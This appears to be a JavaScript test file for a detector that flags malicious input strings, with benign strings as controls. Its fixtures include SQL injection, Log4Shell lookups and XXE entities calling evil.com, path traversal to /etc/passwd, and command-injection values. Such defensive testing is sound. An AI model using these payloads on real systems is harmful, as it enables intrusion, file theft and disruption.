import { describe, it, expect } from 'vitest';
import { __internal } from '../fingerprint.js';

// On importe la fonction privée via l'export __internal pour les tests
const { isMalicious } = __internal;

describe('isMalicious Unit Tests', () => {

    describe('SQL and NoSQL Injections', () => {
        it.each([
            ["' OR '1'='1'"],
            ["' or '1'='1' --"],
            ["UNION SELECT username, password FROM users"],
            ["; DROP TABLE products;--"],
            ["SLEEP(5)"],
            ["BENCHMARK(10000,MD5('a'))"],
            ["WAITFOR DELAY '0:0:5'"],
            ['{"$ne": null}'],
        ])('should detect malicious SQL/NoSQL pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["A normal comment -- for a blog post."],
            ["Please select your union representative."],
            ["The price is not equal to $10."],
            ["My favorite song is 'Stairway to Heaven'."],
        ])('should NOT detect legitimate string: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });

    describe('Log4Shell (JNDI Injection)', () => {
        it.each([
            ["${jndi:ldap://evil.com/a}"],
            ["${jndi:rmi://evil.com/a}"],
            ["${jndi:dns://evil.com/a}"],
            ["${JNDI:LDAP://evil.com/a}"], // Case-insensitive
        ])('should detect Log4Shell pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["The variable is ${user.name}"],
            ["This is a normal log message."],
        ])('should NOT detect legitimate log message: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });

    describe('Server-Side Template Injection (SSTI)', () => {
        it.each([
            ["{{ 7*7 }}"],
            ["{% if user.isAdmin %}{% endif %}"],
            ["Hello {{user.name}}"], // Potentially risky
        ])('should detect SSTI pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["A normal string with {curly braces}"],
            ["(100%)"],
        ])('should NOT detect legitimate string with braces: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });

    describe('XML External Entity (XXE)', () => {
        it.each([
            ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'],
            ['<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">'],
        ])('should detect XXE pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["<!DOCTYPE html>"],
            ["<note><to>Tove</to></note>"],
        ])('should NOT detect legitimate XML/HTML: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });

    describe('Path Traversal', () => {
        it.each([
            ["../../../../etc/passwd"],
            ["..\\..\\..\\..\\windows\\system32\\config.sam"],
        ])('should detect Path Traversal pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["path/to/a/legitimate/file.txt"],
            ["Just two dots.. not a traversal."],
        ])('should NOT detect legitimate path: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });

    describe('Command Injection', () => {
        it.each([
            ["/path/to/script.sh; ls -la"],
            ["127.0.0.1 && whoami"],
            ["`reboot`"],
            ["filename.txt\ncat /etc/passwd"],
        ])('should detect Command Injection pattern: %s', (payload) => {
            expect(isMalicious(payload)).toBe(true);
        });

        it.each([
            ["A normal command like ls -la /tmp"],
            ["Use the pipe | for output redirection."],
        ])('should NOT detect legitimate command-like string: %s', (payload) => {
            expect(isMalicious(payload)).toBe(false);
        });
    });
});